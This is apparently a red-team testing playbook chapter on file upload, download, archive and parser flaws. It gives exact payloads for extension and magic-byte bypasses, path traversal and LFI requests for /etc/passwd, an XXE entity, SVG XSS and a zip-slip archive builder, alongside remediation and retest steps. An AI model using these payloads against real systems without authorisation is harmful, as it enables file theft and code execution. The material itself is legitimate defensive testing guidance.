# 08 — File Handling

## 1. Scope and preconditions

The app accepts uploads, serves downloads, imports archives, or parses documents. Test only seeded files and a harmless marker. Do not upload a real webshell or execute anything beyond `id`/`hostname`.

```bash
TARGET="http://127.0.0.1:5001"
OUT=".redteam/evidence/files"
mkdir -p "$OUT"
```

## 2. Required Test Identities and seeded data

User A for uploads and downloads; user B for a cross-user file object; admin for admin-only imports. Seed a text file, an image, and an archive owned by each identity.

## 3. Enumeration

```bash
curl -sS -b "$OUT/cookies_a.txt" "$TARGET/api/files" | jq .
curl -sS -b "$OUT/cookies_a.txt" "$TARGET/api/files/<A_FILE_ID>" -o "$OUT/download.bin"
curl -sS -i "$TARGET/uploads/" | head
```

Map upload fields, download routes, file IDs, storage paths, and any filename or path parameter.

## 4. Test cases

| # | Test | Exact request / command | Signal |
|---|---|---|---|
| 1 | Extension bypass | Upload `marker.php.jpg` with `Content-Type: image/jpeg`; request the stored path | Server executes PHP or serves source |
| 2 | Content-Type bypass | Upload a text file as `image/png` | Accepted and served as HTML/JS |
| 3 | Magic-byte bypass | Prepend `GIF89a;` to a script payload | Accepted as an image |
| 4 | Filename traversal | `filename=../../static/marker.txt` | File written outside the upload dir |
| 5 | Download traversal | `curl -sS "$TARGET/download?file=../../../../etc/hosts"` | Local file returned |
| 6 | LFI | `?page=../../../../etc/passwd`, `?template=php://filter/convert.base64-encode/resource=index` | File contents or encoded source |
| 7 | Zip slip | Create a zip with `../../marker.txt` and upload/extract | File written outside the target |
| 8 | XXE | Upload XML with `<!ENTITY xxe SYSTEM "file:///etc/hosts">` | File contents in the parsed response |
| 9 | SVG XSS | Upload `<svg onload=alert(1)>` and view it | Script executes in the viewer |
| 10 | Unrestricted static path | Request `/uploads/<uploaded>.html` | HTML/JS served from the app origin |
| 11 | Cross-user file | As A, download B's file ID | B's file returned |
| 12 | Path in archive entry | Entry name with absolute path or backslashes | Extracted outside the root |

### Creating the test artifacts

```bash
printf 'MARKER-<engagement-id>\n' > "$OUT/marker.txt"
cp "$OUT/marker.txt" "$OUT/marker.php.jpg"
printf 'GIF89a;\n<?php echo "MARKER"; ?>' > "$OUT/marker.gif.php"
printf '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>' > "$OUT/marker.svg"
python3 - <<'PY'
import zipfile
with zipfile.ZipFile(".redteam/evidence/files/slip.zip", "w") as z:
    z.writestr("../../marker-slip.txt", "MARKER")
PY
```

Upload with `curl -F` and then request the returned path. Stop at the marker; do not execute a shell.

## 5. Bypass variants

- Double extensions: `.jpg.php`, `.php.jpg`, `.phtml`, `.phar`, `.jspx`, `.aspx`.
- Null byte and truncation: `marker.php%00.jpg`, long filenames.
- Content-Type and magic bytes: `image/png`, `GIF89a`, `%PDF-1.4`.
- Case and Unicode: `.PHP`, `.PhP`, homoglyphs, right-to-left override.
- Path normalization: `..%2f`, `%252e%252e%252f`, backslashes, absolute paths.
- Archive entries: `../`, `..\\`, symlinks, nested archives.
- Parser features: external entities, XInclude, SVG `onload`, image metadata.

## 6. Evidence to capture

- The upload request, the stored path, and the response.
- The downloaded content or executed marker.
- The traversal request and the returned file's first bytes.
- The archive listing and the extracted path.
- The parser response containing the entity value.

## 7. False-positive traps

- An uploaded `.php` file may be served as plain text; that is not RCE. Check the response headers and body.
- A 200 on a traversal path may be a custom 404. Require known file content.
- XXE may be disabled by the parser; a `400` is a pass, not a finding.
- SVG may be sanitized on render. Test in the actual viewer, not just the raw file.
- A file downloaded by ID may be public by design. Check the ownership model.

## 8. Severity guidance

| Finding | Typical severity | CWE / WSTG |
|---|---|---|
| Upload to RCE | Critical | CWE-434, WSTG-BUSL-09 |
| Path traversal read | High | CWE-22, WSTG-ATHZ-01 |
| LFI to source/secret | High | CWE-98, WSTG-ATHZ-01 |
| Zip slip write | High | CWE-22, CWE-409 |
| XXE file read | High | CWE-611, WSTG-INPV-07 |
| Stored SVG XSS | Medium | CWE-79, CWE-434 |
| Cross-user file download | High | CWE-639, WSTG-ATHZ-04 |
| Unrestricted HTML upload | Medium | CWE-434, CWE-79 |

## 9. Remediation patterns

- Store uploads outside the web root; serve through an authorized handler.
- Validate extension, content type, and magic bytes; generate a new random filename.
- Never trust the client filename; strip path separators and absolute paths.
- Disable execution in the upload directory.
- Resolve the final path and verify it stays under the intended root.
- Disable external entities and XInclude; use a safe parser configuration.
- Sanitize SVG or serve it as an attachment with a safe content type.
- Enforce object-level authorization on every download.

## 10. Retest procedure

Replay each upload and traversal. Expect rejection or a safe, non-executable response. Request the uploaded marker and confirm it is served as an attachment or inert content. Replay the archive and XXE payloads; expect no file read or write outside the root. Replay the cross-user download; expect `403`/`404`.

## Resources

- OWASP WSTG: WSTG-BUSL-08, WSTG-BUSL-09, WSTG-ATHZ-01, WSTG-INPV-07.
- OWASP Cheat Sheet: File Upload, XXE Prevention, Path Traversal.
- CWE-22, CWE-98, CWE-409, CWE-434, CWE-611, CWE-639.
- PortSwigger Academy: file upload, path traversal, XXE labs.
